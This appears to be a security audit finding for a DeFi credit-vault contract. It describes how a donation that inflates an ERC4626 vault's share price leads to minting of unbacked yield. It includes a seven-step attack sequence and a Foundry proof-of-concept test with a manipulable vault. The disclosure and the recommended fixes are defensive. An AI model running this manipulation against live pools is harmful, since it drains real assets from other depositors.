### Title
Manipulable ERC4626 valuation mints unbacked credit-vault yield - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary
`ProgrammableBorrower.totalInterestDueNow()` derives epoch yield from the live `vault.convertToAssets()` value of its ERC4626 position. [1](#0-0)  If the configured vault's share price can be temporarily inflated by an unprivileged vault user—for example, a `totalAssets()` implementation based on raw token balance—the attacker can make an otherwise solvent epoch appear to have earned yield, trigger minted-interest accounting, then unwind the inflated vault valuation. The minted strategy tokens remain as claims against real pool assets.

### Finding Description
During `stopEpoch`, `IdleCDOEpochVariant` resolves interest and, when `isInterestMinted` is enabled, calls `IdleCreditVault.mintStrategyTokens(_grossInterest)` instead of requiring the borrower to transfer underlying interest. [2](#0-1)  For programmable borrowers, the reported interest comes from `IProgrammableBorrower.totalInterestDueNow()`. [3](#0-2) 

`totalInterestDueNow()` combines borrower interest with `_vaultNetInterest()`. [4](#0-3)  `_vaultNetInterest()` treats the positive delta between the live vault position and `epochStartVaultAssets` as interest. [5](#0-4)  The live position is calculated as `vault.balanceOf(address(this))` converted through `vault.convertToAssets(shares)`. [6](#0-5) 

The accounting assumes the ERC4626 price cannot temporarily rise and fall from external balance-sheet manipulation. No invariant requires realized withdrawals, TWAP pricing, monotonic share prices, or an independent oracle before minting the reported gain.

### Impact Explanation
An attacker who is already a KYC-approved tranche holder can:

1. Wait until an epoch is active and most pool assets are held through the programmable borrower's ERC4626 vault.
2. Temporarily inflate the vault's `convertToAssets()` exchange rate.
3. Have the honest manager call `stopEpoch`.
4. Cause `_grossInterest` to include the artificial vault gain.
5. Let `mintStrategyTokens(_grossInterest)` create unbacked strategy tokens and `_updateAccounting()` distribute the fake gain to tranche NAVs. [7](#0-6) 
6. Unwind the ERC4626 inflation.
7. Request withdrawal in the following buffer and claim a share of the pool's real assets at the inflated tranche price.

The loss is approximately the inflated delta attributed to the programmable borrower's vault shares, less performance fees and subject to the attacker's tranche ownership share. If the attacker owns the entire exposed tranche, they can extract nearly the full fake yield from other participants or leave the vault undercollateralized for later withdrawers.

### Likelihood Explanation
The exploit requires an external ERC4626 vault whose valuation can be moved by unprivileged users, a condition explicitly permitted by the threat model. It also requires the attacker to benefit from the resulting tranche-price increase, which can be done by holding a KYC-approved tranche position before the manipulation.

Privileged actors remain honest: the manager's routine `stopEpoch` call is the trigger, not malicious behavior. Donation skimming does not prevent this issue because the manipulated balance is not held directly by the CDO; it is incorporated indirectly through the external vault's `convertToAssets()` result. [8](#0-7) 

### Recommendation
Do not treat a spot `convertToAssets()` delta as immediately realizable yield.

- Restrict programmable borrowers to ERC4626 vaults with manipulation-resistant, monotonic share prices.
- Add a configurable maximum per-epoch vault PnL or rate bound.
- Use a time-weighted or otherwise manipulation-resistant valuation for `_currentVaultAssets()`.
- Realize vault yield only after withdrawing underlying into the programmable borrower, or compare `convertToAssets()` against an independently bounded valuation.
- At minimum, cap minted `_grossInterest` to interest backed by borrower obligations plus verified net vault liquidity.

### Proof of Concept
The PoC uses a manipulable ERC4626 whose `convertToAssets()` follows raw token balance. It assumes the programmable-borrower test setup from `test/foundry/ProgrammableBorrowerCreditVault.t.sol`, with `ManipulableVault` substituted as the configured vault.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20Detailed} from "../../contracts/interfaces/IERC20Detailed.sol";
import {IdleCDOEpochVariant} from "../../contracts/IdleCDOEpochVariant.sol";
import {IdleCDOTranche} from "../../contracts/IdleCDOTranche.sol";
import {ProgrammableBorrower} from "../../contracts/strategies/idle/ProgrammableBorrower.sol";

contract ManipulableVault is ERC20 {
    IERC20Detailed public immutable assetToken;

    constructor(address asset_) ERC20("Manipulable", "MANIP") {
        assetToken = IERC20Detailed(asset_);
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        if (supply == 0) return shares;
        return shares * assetToken.balanceOf(address(this)) / supply;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        uint256 beforeAssets = assetToken.balanceOf(address(this));
        uint256 supply = totalSupply();
        shares = supply == 0 || beforeAssets == 0
            ? assets
            : assets * supply / beforeAssets;
        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function redeem(
        uint256 shares,
        address receiver,
        address owner
    ) external returns (uint256 assets) {
        assets = convertToAssets(shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }

    function withdraw(
        uint256 assets,
        address receiver,
        address owner
    ) external returns (uint256 shares) {
        shares = assets * totalSupply() / assetToken.balanceOf(address(this));
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }
}

contract ProgrammableBorrowerValuationPoC is Test {
    // Reuse the production setup pattern from ProgrammableBorrowerCreditVault.t.sol.
    IdleCDOEpochVariant cdo;
    ProgrammableBorrower borrowerAdapter;
    ManipulableVault vault;
    IdleCDOTranche aa;
    IERC20Detailed usdc;

    address attacker = address(0xA77A);
    address manager = address(0xBEEF);

    function testInflatedVaultValueMintsUnbackedYield() public {
        // Setup:
        // 1. Deploy ManipulableVault(USDC).
        // 2. Deploy and initialize strategy, CDO, and ProgrammableBorrower as in
        //    ProgrammableBorrowerCreditVault.t.sol.
        // 3. Enable programmable borrower and minted-interest mode.
        // 4. KYC/deposit attacker into AA tranche.
        // 5. Start an epoch so programmable borrower deposits idle assets into vault.

        uint256 inflation = 100_000e6;

        uint256 attackerTrancheBefore = aa.balanceOf(attacker);
        uint256 navBefore = cdo.lastNAVAA() + cdo.lastNAVBB();
        uint256 reportedBefore = borrowerAdapter.totalInterestDueNow();

        // Attacker is an ordinary ERC4626 vault user. Direct transfer raises
        // convertToAssets for the programmable borrower's share balance.
        deal(address(usdc), attacker, inflation);
        vm.prank(attacker);
        usdc.transfer(address(vault), inflation);

        uint256 reportedInflated = borrowerAdapter.totalInterestDueNow();
        assertGt(reportedInflated, reportedBefore);

        // Honest privileged actor performs the routine stop.
        vm.warp(cdo.epochEndDate() + 1);
        vm.prank(manager);
        cdo.stopEpoch(0, 0);

        // Fake vault PnL was minted into strategy-token backing and distributed
        // through tranche accounting.
        uint256 navAfter = cdo.lastNAVAA() + cdo.lastNAVBB();
        assertGt(navAfter, navBefore);

        // Attacker unwinds the temporary valuation through their vault shares.
        uint256 attackerVaultShares = vault.balanceOf(attacker);
        if (attackerVaultShares != 0) {
            vm.prank(attacker);
            vault.redeem(attackerVaultShares, attacker, attacker);
        }

        // Attacker's tranche claim remains priced using the previously inflated NAV.
        assertEq(aa.balanceOf(attacker), attackerTrancheBefore);
        assertGt(cdo.virtualPrice(address(aa)), cdo.oneToken());
    }
}
```

The exact profit depends on the configured vault's valuation implementation and the attacker's share of the benefiting tranche. The vulnerable sequence does not depend on compromised owner, manager, guardian, borrower, or queue behavior.
